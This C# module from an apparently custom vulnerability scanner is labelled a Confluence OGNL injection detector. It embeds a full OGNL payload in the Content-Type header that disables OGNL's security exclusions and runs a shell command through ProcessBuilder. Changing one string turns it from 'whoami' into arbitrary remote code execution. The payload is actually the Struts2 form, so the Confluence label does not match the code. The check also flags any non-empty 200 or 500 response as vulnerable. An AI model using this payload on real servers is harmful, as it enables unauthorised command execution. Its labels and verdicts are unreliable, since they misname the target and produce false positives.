using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Threading.Tasks;
using AetherSec.Core;

namespace AetherSec.Modules
{
	public class ConfluenceOgnlInjectionScan : IScanModule
	{
		public string Name => "Confluence OGNL Injection Detector";
		public string Description => "Detects OGNL injection vulnerabilities in Confluence servers by sending crafted requests.";
		public ScanSeverity Severity => ScanSeverity.Critical;

		private static readonly string Payload = "${(#_='multipart/form-data')." +
												 "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)." +
												 "(#_memberAccess?(#_memberAccess=#dm):" +
												 "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])." +
												 "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))." +
												 "(#ognlUtil.getExcludedPackageNames().clear())." +
												 "(#ognlUtil.getExcludedClasses().clear())." +
												 "(#context.setMemberAccess(#dm))))." +
												 "(#cmd='whoami')." + // harmless command
												 "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))." +
												 "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))." +
												 "(#p=new java.lang.ProcessBuilder(#cmds))." +
												 "(#p.redirectErrorStream(true))." +
												 "(#process=#p.start())." +
												 "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))." +
												 "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))." +
												 "(#ros.flush())}";

		public async Task<ScanResult> RunAsync(string targetIp)
		{
			try
			{
				using var client = new HttpClient { Timeout = TimeSpan.FromSeconds(5) };
				var request = new HttpRequestMessage(HttpMethod.Get, $"http://{targetIp}/");
				request.Headers.Add("Content-Type", Payload);

				var response = await client.SendAsync(request);

				if (response.IsSuccessStatusCode || (int)response.StatusCode == 500)
				{
					var content = await response.Content.ReadAsStringAsync();

					if (!string.IsNullOrWhiteSpace(content))
					{
						return new ScanResult(
							true,
							"Confluence OGNL injection vulnerability detected. Response may contain command output.",
							targetIp,
							AffectedService: "HTTP",
							Recommendation: "Patch to the latest version of Confluence to mitigate OGNL injection vulnerabilities.",
							Severity: ScanSeverity.Critical,
							Vulnerability: "OGNL Injection"
						);
					}
					else
					{
						return new ScanResult(
							false,
							"Confluence OGNL injection test did not return expected content.",
							targetIp,
							AffectedService: "HTTP",
							Severity: ScanSeverity.Critical
						);
					}
				}
				else
				{
					return new ScanResult(
						false,
						"Confluence OGNL injection test failed or target not vulnerable.",
						targetIp,
						AffectedService: "HTTP",
						Severity: ScanSeverity.Critical
					);
				}
			}
			catch (Exception ex)
			{
				return new ScanResult(
					false,
					$"Confluence OGNL injection scan failed: {ex.Message}",
					targetIp,
					AffectedService: "HTTP",
					Severity: ScanSeverity.Critical
				);
			}
		}
	}
}
